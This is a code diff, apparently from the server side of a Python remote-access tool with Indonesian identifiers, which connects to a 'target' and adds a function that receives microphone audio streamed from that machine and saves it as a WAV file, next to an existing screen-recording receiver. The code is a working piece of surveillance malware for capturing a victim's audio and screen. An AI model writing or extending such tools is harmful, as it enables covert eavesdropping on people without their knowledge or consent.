@@ -16,6 +16,38 @@ _target = koneksi[0]
 ip = koneksi[1]
 print(_target)
 print(f'[+] Terhubung ke {str(ip)}')
+
+
+FORMAT = pyaudio.paInt16
+CHANNELS = 1
+RATE = 44100
+CHUNK = 1024
+
+def receive_and_save():
+     frames = []
+     try:
+          with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+               s.bind(('192.168.18.210', 9996))
+               s.listen(1)
+               conn, addr = s.accept()
+               with conn:
+                    print('connect')
+                    while True:
+                         data = conn.recv(CHUNK)
+                         if not data:
+                              break
+                         frames.append(data)
+          print('saving WAV file')
+          WAVE_OUTPUT = "retrieved_audio.wav"
+          with wave.open(WAVE_OUTPUT, 'wb') as wf:
+               wf.setnchannels(CHANNELS)
+               wf.setsampwidth(2)
+               wf.setframerate(RATE)
+               wf.writeframes(b''.join(frames))
+          print(f'{WAVE_OUTPUT}')
+     except socket.error as e:
+          print(e)
+
 def konversi_byte_screen_recorder():
      sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      sock.bind(('192.168.18.210', 9997))
